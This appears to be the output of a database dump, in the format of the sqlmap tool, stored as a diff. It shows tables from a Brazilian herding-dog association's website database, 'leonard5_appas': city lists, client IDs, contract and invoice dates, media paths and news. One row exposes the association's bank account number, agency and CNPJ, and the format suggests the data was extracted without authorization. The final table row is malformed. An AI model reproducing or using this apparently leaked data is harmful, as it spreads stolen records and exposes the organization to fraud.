+| Jaguaquara      | 411       | 5         |
+| Jaguarari       | 412       | 5         |
+| Jaguaripe       | 413       | 5         |
+| Jandaíra        | 414       | 5         |
+| Jequié          | 415       | 5         |
+| Jeremoabo       | 416       | 5         |
+| Jiquiriçá       | 417       | 5         |
+| Jitaúna         | 418       | 5         |
+| Juazeiro        | 420       | 5         |
+| Jucuruçu        | 421       | 5         |
+| Jussara         | 422       | 5         |
+| Jussari         | 423       | 5         |
+| Jussiape        | 424       | 5         |
+| Laje            | 427       | 5         |
+| Lajedão         | 428       | 5         |
+| Lajedinho       | 429       | 5         |
+| Lamarão         | 431       | 5         |
+| Lapão           | 432       | 5         |
+| Lençóis         | 434       | 5         |
+| Macajuba        | 438       | 5         |
+| Macarani        | 439       | 5         |
+| Macaúbas        | 440       | 5         |
+| Macururé        | 441       | 5         |
+| Maetinga        | 443       | 5         |
+| Maiquinique     | 444       | 5         |
+| Mairi           | 445       | 5         |
+| Malhada         | 446       | 5         |
+| Mansidão        | 449       | 5         |
+| Maracás         | 450       | 5         |
+| Maragogipe      | 451       | 5         |
+| Maraú           | 452       | 5         |
+| Mascote         | 454       | 5         |
+| Matina          | 456       | 5         |
+| Milagres        | 459       | 5         |
++-----------------+-----------+-----------+
+
+Database: leonard5_appas
+Table: classificados
+[2 entries]
++----------+-----------------+----------------------------+---------+----------+-----------------------------------------------------------------------------------------------------------+-------------+-------------+----------------+
+| id_midia | id_classificado | nome                       | email   | telefone | descricao                                                                                                 | periodo_fim | responsavel | periodo_inicio |
++----------+-----------------+----------------------------+---------+----------+-----------------------------------------------------------------------------------------------------------+-------------+-------------+----------------+
+| 89       | 12              | Classificado da APPAS 2015 | <blank> | <blank>  | Espaço                                                                                                    | <blank>     | APPAS       | <blank>        |
+| 117      | 13              | Conta corrente APPAS       | <blank> | <blank>  | Banco Bradesco\nAgencia:0225/9\nConta:5.087-3\nCNPJ: 09.213.514/0001-08\nAssociação Paulista de Pastoreio | <blank>     | <blank>     | <blank>        |
++----------+-----------------+----------------------------+---------+----------+-----------------------------------------------------------------------------------------------------------+-------------+-------------+----------------+
+
+Database: leonard5_appas
+Table: clientes
+[70 entries]
++-----------+------------+-------+
+| id_pessoa | id_cliente | ativo |
++-----------+------------+-------+
+| 64        | 46         | 1     |
+| 65        | 47         | 1     |
+| 66        | 48         | 1     |
+| 68        | 50         | 1     |
+| 69        | 51         | 1     |
+| 70        | 52         | 1     |
+| 71        | 53         | 1     |
+| 72        | 54         | 1     |
+| 73        | 55         | 0     |
+| 75        | 57         | 1     |
+| 76        | 58         | 1     |
+| 78        | 60         | 1     |
+| 79        | 61         | 1     |
+| 80        | 62         | 1     |
+| 81        | 63         | 1     |
+| 82        | 64         | 1     |
+| 83        | 65         | 1     |
+| 85        | 67         | 1     |
+| 86        | 68         | 1     |
+| 87        | 69         | 1     |
+| 88        | 70         | 1     |
+| 89        | 71         | 0     |
+| 90        | 72         | 1     |
+| 91        | 73         | 1     |
+| 92        | 74         | 1     |
+| 94        | 76         | 1     |
+| 95        | 77         | 1     |
+| 96        | 78         | 1     |
+| 98        | 80         | 1     |
+| 99        | 81         | 1     |
+| 103       | 85         | 1     |
+| 104       | 86         | 0     |
+| 105       | 87         | 1     |
+| 106       | 88         | 0     |
+| 107       | 89         | 0     |
+| 108       | 90         | 1     |
+| 109       | 91         | 1     |
+| 110       | 92         | 0     |
+| 111       | 93         | 1     |
+| 112       | 94         | 0     |
+| 113       | 95         | 0     |
+| 114       | 96         | 1     |
+| 115       | 97         | 1     |
+| 116       | 98         | 0     |
+| 117       | 99         | 0     |
+| 118       | 100        | 0     |
+| 119       | 101        | 0     |
+| 120       | 102        | 0     |
+| 121       | 103        | 0     |
+| 122       | 104        | 0     |
+| 123       | 105        | 0     |
+| 124       | 106        | 0     |
+| 125       | 107        | 0     |
+| 126       | 108        | 0     |
+| 127       | 109        | 0     |
+| 128       | 110        | 0     |
+| 129       | 111        | 0     |
+| 130       | 112        | 0     |
+| 131       | 113        | 0     |
+| 132       | 114        | 0     |
+| 133       | 115        | 0     |
+| 134       | 116        | 0     |
+| 135       | 117        | 0     |
+| 136       | 118        | 0     |
+| 137       | 119        | 0     |
+| 138       | 120        | 0     |
+| 139       | 121        | 0     |
+| 140       | 122        | 0     |
+| 141       | 123        | 0     |
+| 142       | 124        | 0     |
++-----------+------------+-------+
+
+Database: leonard5_appas
+Table: cobrancas
+[0 entries]
++-------------+---------------+--------+------------------+------------------+
+| id_cobranca | id_lancamento | codigo | status_pagseguro | codigo_pagseguro |
++-------------+---------------+--------+------------------+------------------+
++-------------+---------------+--------+------------------+------------------+
+
+Database: leonard5_appas
+Table: contratos
+[5 entries]
++------------+-------------+
+| data_fim   | data_inicio |
++------------+-------------+
+| 2015-02-12 | 2015-02-12  |
+| 2015-02-20 | 2015-02-05  |
+| 2015-03-06 | 2015-03-27  |
+| 2015-03-10 | 2015-03-09  |
+| 2015-04-23 | 2015-04-23  |
++------------+-------------+
+
+Database: leonard5_appas
+Table: cursos
+[1 entry]
++-------+------------+-------------+
+| valor | data_fim   | data_inicio |
++-------+------------+-------------+
+| 0     | 2015-04-24 | 2015-03-22  |
++-------+------------+-------------+
+
+Database: leonard5_appas
+Table: estados
+[17 entries]
++-----------+------------+-----------+
+| id_estado | est_nome   | est_sigla |
++-----------+------------+-----------+
+| 1         | Acre       | AC        |
+| 2         | Alagoas    | AL        |
+| 3         | Amazonas   | AM        |
+| 4         | Amapá      | AP        |
+| 5         | Bahia      | BA        |
+| 6         | Ceará      | CE        |
+| 9         | Goiás      | GO        |
+| 10        | Maranhão   | MA        |
+| 14        | Pará       | PA        |
+| 15        | Paraíba    | PB        |
+| 16        | Pernambuco | PE        |
+| 17        | Piauí      | PI        |
+| 18        | Paraná     | PR        |
+| 21        | Rondônia   | RO        |
+| 22        | Roraima    | RR        |
+| 25        | Sergipe    | SE        |
+| 27        | Tocantins  | TO        |
++-----------+------------+-----------+
+
+Database: leonard5_appas
+Table: faturas
+[3 entries]
++-----------------+-----------------+
+| data_vencimento | data_lancamento |
++-----------------+-----------------+
+| 2015-03-11      | 2015-03-09      |
+| 2015-03-13      | 2015-03-10      |
+| 2015-04-30      | 2015-04-23      |
++-----------------+-----------------+
+
+Database: leonard5_appas
+Table: fornecedores
+[3 entries]
++-----------+---------------+
+| id_pessoa | id_fornecedor |
++-----------+---------------+
+| 11        | 2             |
+| 16        | 4             |
+| 18        | 5             |
++-----------+---------------+
+
+Database: leonard5_appas
+Table: galeria_midias
+[53 entries]
++---------------+----------------+
+| id_midia_item | id_album_midia |
++---------------+----------------+
+| 238           | 0              |
+| 239           | 0              |
+| 246           | 0              |
+| 250           | 0              |
+| 251           | 0              |
+| 252           | 0              |
+| 253           | 0              |
+| 254           | 0              |
+| 257           | 0              |
+| 258           | 0              |
+| 259           | 0              |
+| 261           | 0              |
+| 262           | 0              |
+| 263           | 0              |
+| 264           | 0              |
+| 265           | 0              |
+| 305           | 0              |
+| 306           | 0              |
+| 307           | 0              |
+| 308           | 0              |
+| 309           | 0              |
+| 310           | 0              |
+| 311           | 0              |
+| 312           | 0              |
+| 316           | 0              |
+| 317           | 0              |
+| 318           | 0              |
+| 319           | 0              |
+| 320           | 0              |
+| 321           | 0              |
+| 322           | 0              |
+| 323           | 0              |
+| 324           | 0              |
+| 325           | 0              |
+| 326           | 0              |
+| 327           | 0              |
+| 328           | 0              |
+| 329           | 0              |
+| 330           | 0              |
+| 331           | 0              |
+| 332           | 0              |
+| 333           | 0              |
+| 334           | 0              |
+| 335           | 0              |
+| 336           | 0              |
+| 337           | 0              |
+| 338           | 0              |
+| 350           | 0              |
+| 351           | 0              |
+| 228           | 29             |
+| 230           | 29             |
+| 233           | 29             |
+| 234           | 29             |
++---------------+----------------+
+
+Database: leonard5_appas
+Table: informacoes_diretoria
+[0 entries]
++-------------------------+----------+-----------+--------------------+
+| id_informacao_diretoria | estatuto | diretoria | regulamento_provas |
++-------------------------+----------+-----------+--------------------+
++-------------------------+----------+-----------+--------------------+
+
+Database: leonard5_appas
+Table: informacoes_site
+[1 entry]
++-----------+--------------------+---------+---------+---------+-------------------------------------------------------+---------+---------+---------+---------+---------+-----------------------------------------+----------+----------+-----------+--------------+--------------+--------------+
+| id_cidade | id_informacao_site | cep     | email   | bairro  | sobre_1                                               | sobre_3 | sobre_2 | twitter | youtube | celular | facebook                                | telefone | endereco | instagram | quem_somos_1 | quem_somos_3 | quem_somos_2 |
++-----------+--------------------+---------+---------+---------+-------------------------------------------------------+---------+---------+---------+---------+---------+-----------------------------------------+----------+----------+-----------+--------------+--------------+--------------+
+| 0         | 1                  | <blank> | <blank> | <blank> | Cada vez mais os cães assumem um lugar de importância | <blank> | <blank> | <blank> | <blank> | <blank> | https://www.facebook.com/appaspastoreio | <blank>  | <blank>  | <blank>   | <blank>      | <blank>      | <blank>      |
++-----------+--------------------+---------+---------+---------+-------------------------------------------------------+---------+---------+---------+---------+---------+-----------------------------------------+----------+----------+-----------+--------------+--------------+--------------+
+
+Database: leonard5_appas
+Table: inscricao
+[0 entries]
++----------+-----------+--------------+
+| id_prova | id_pessoa | id_inscricao |
++----------+-----------+--------------+
++----------+-----------+--------------+
+
+Database: leonard5_appas
+Table: lancamentos
+[4 entries]
++----------------+-----------------+-----------------+
+| data_pagamento | data_vencimento | data_lancamento |
++----------------+-----------------+-----------------+
+| NULL           | 2015-04-30      | 2015-04-23      |
+| 0000-00-00     | 2015-03-11      | 2015-03-10      |
+| 2015-03-11     | 2015-03-10      | 2015-03-10      |
+| 2015-03-27     | 2015-03-28      | 2015-03-27      |
++----------------+-----------------+-----------------+
+
+Database: leonard5_appas
+Table: lancamentos_fixos
+[1 entry]
++-----------------+-----------------+
+| data_vencimento | data_lancamento |
++-----------------+-----------------+
+| 2015-01-14      | 2015-01-15      |
++-----------------+-----------------+
+
+Database: leonard5_appas
+Table: midia_itens
+[8 entries]
++---------------+-------------------------+------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------+------------+
+| id_midia_item | nome                    | caminho                                                                                                          | thumbnail                                                                                                                  | comentario |
++---------------+-------------------------+------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------+------------+
+| 219           | midia_54f0bc52dfc9f.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/ninhadas/3/midia_54f0bc52dfc9f.jpg  | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/ninhadas/3/thumbnail/midia_54f0bc52dfc9f.jpg  | <blank>    |
+| 220           | midia_54f0bc54562e6.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/ninhadas/3/midia_54f0bc54562e6.jpg  | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/ninhadas/3/thumbnail/midia_54f0bc54562e6.jpg  | <blank>    |
+| 221           | midia_55018f4b03450.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/13/midia_55018f4b03450.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/13/thumbnail/midia_55018f4b03450.jpg | <blank>    |
+| 222           | midia_550197048e39a.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/midia_550197048e39a.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/thumbnail/midia_550197048e39a.jpg | <blank>    |
+| 223           | midia_55019c4e7886d.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/midia_55019c4e7886d.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/thumbnail/midia_55019c4e7886d.jpg | <blank>    |
+| 224           | midia_55019c4f97d20.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/midia_55019c4f97d20.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/thumbnail/midia_55019c4f97d20.jpg | <blank>    |
+| 225           | midia_55019ca08f664.png | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/midia_55019ca08f664.png | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/thumbnail/midia_55019ca08f664.png | <blank>    |
+| 226           | midia_55019ca1c9fd1.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/midia_55019ca1c9fd1.jpg | http://localhost/GERENCIADOR/admin/views/midias/server/php/files/gerenciador/produtos/14/thumbnail/midia_55019ca1c9fd1.jpg | <blank>    |
++---------------+-------------------------+------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------+------------+
+
+Database: leonard5_appas
+Table: midias
+[155 entries]
++----------+----------------+
+| id_midia | id_album_midia |
++----------+----------------+
+| 1        | 1              |
+| 2        | 2              |
+| 3        | 3              |
+| 4        | 4              |
+| 5        | 5              |
+| 6        | 6              |
+| 7        | 7              |
+| 8        | 8              |
+| 9        | 9              |
+| 10       | 10             |
+| 11       | 11             |
+| 12       | 12             |
+| 13       | 13             |
+| 14       | 14             |
+| 15       | 15             |
+| 16       | 16             |
+| 17       | 17             |
+| 18       | 18             |
+| 19       | 19             |
+| 20       | 20             |
+| 21       | 21             |
+| 22       | 22             |
+| 23       | 23             |
+| 24       | 24             |
+| 25       | 25             |
+| 26       | 26             |
+| 27       | 27             |
+| 28       | 28             |
+| 29       | 29             |
+| 30       | 30             |
+| 31       | 31             |
+| 32       | 32             |
+| 33       | 33             |
+| 34       | 34             |
+| 35       | 35             |
+| 36       | 36             |
+| 37       | 37             |
+| 38       | 38             |
+| 39       | 39             |
+| 40       | 40             |
+| 41       | 41             |
+| 42       | 42             |
+| 43       | 43             |
+| 44       | 44             |
+| 45       | 45             |
+| 46       | 46             |
+| 47       | 47             |
+| 48       | 48             |
+| 49       | 49             |
+| 50       | 50             |
+| 51       | 51             |
+| 52       | 52             |
+| 53       | 53             |
+| 54       | 54             |
+| 55       | 55             |
+| 56       | 56             |
+| 57       | 57             |
+| 58       | 58             |
+| 59       | 59             |
+| 60       | 60             |
+| 61       | 61             |
+| 62       | 62             |
+| 63       | 63             |
+| 64       | 64             |
+| 65       | 65             |
+| 66       | 66             |
+| 67       | 67             |
+| 68       | 68             |
+| 69       | 69             |
+| 70       | 70             |
+| 71       | 71             |
+| 72       | 72             |
+| 73       | 73             |
+| 74       | 74             |
+| 75       | 75             |
+| 76       | 76             |
+| 77       | 77             |
+| 78       | 78             |
+| 79       | 79             |
+| 80       | 80             |
+| 81       | 81             |
+| 82       | 82             |
+| 83       | 83             |
+| 84       | 84             |
+| 85       | 85             |
+| 86       | 86             |
+| 87       | 87             |
+| 88       | 88             |
+| 89       | 89             |
+| 90       | 90             |
+| 91       | 91             |
+| 92       | 92             |
+| 93       | 93             |
+| 94       | 94             |
+| 95       | 95             |
+| 96       | 96             |
+| 97       | 97             |
+| 98       | 98             |
+| 99       | 99             |
+| 100      | 100            |
+| 101      | 101            |
+| 102      | 102            |
+| 103      | 103            |
+| 104      | 104            |
+| 105      | 105            |
+| 106      | 106            |
+| 107      | 107            |
+| 108      | 108            |
+| 109      | 109            |
+| 110      | 110            |
+| 111      | 111            |
+| 112      | 112            |
+| 113      | 113            |
+| 114      | 114            |
+| 115      | 115            |
+| 116      | 116            |
+| 117      | 117            |
+| 118      | 118            |
+| 119      | 119            |
+| 120      | 120            |
+| 121      | 121            |
+| 122      | 122            |
+| 123      | 123            |
+| 124      | 124            |
+| 125      | 125            |
+| 126      | 126            |
+| 127      | 127            |
+| 128      | 128            |
+| 129      | 129            |
+| 130      | 130            |
+| 131      | 131            |
+| 132      | 132            |
+| 133      | 133            |
+| 134      | 134            |
+| 135      | 135            |
+| 136      | 136            |
+| 137      | 137            |
+| 138      | 138            |
+| 139      | 139            |
+| 140      | 140            |
+| 141      | 141            |
+| 142      | 142            |
+| 143      | 143            |
+| 144      | 144            |
+| 145      | 145            |
+| 146      | 146            |
+| 147      | 147            |
+| 148      | 148            |
+| 149      | 149            |
+| 150      | 150            |
+| 151      | 151            |
+| 152      | 152            |
+| 153      | 153            |
+| 154      | 154            |
+| 155      | 155            |
++----------+----------------+
+
+Database: leonard5_appas
+Table: ninhadas
+[1 entry]
++----------+------------+--------+--------+--------------+----------+------------+-----------+
+| id_midia | id_ninhada | mae    | pai    | nome         | registro | data_nasc  | descricao |
++----------+------------+--------+--------+--------------+----------+------------+-----------+
+| 19       | 3          | sdasad | sadsad | Ninhada 1 5  | dssada   | 2015-02-05 |  dassda   |
++----------+------------+--------+--------+--------------+----------+------------+-----------+
+
+Database: leonard5_appas
+Table: niveis_acesso
+[0 entries]
++-----------------+------+
+| id_nivel_acesso | nome |
++-----------------+------+
++-----------------+------+
+
+Database: leonard5_appas
+Table: noticias
+[1 entry]
++----------+------------+------+--------------+--------------+
+| id_midia | id_noticia | nome | autor        | data_noticia |
++----------+------------+------+--------------+--------------+
+| 136      | 31         | PEDRO LOTUFO | 2016-05-25   |
++----------+------------+------+--------------+--------------+
+
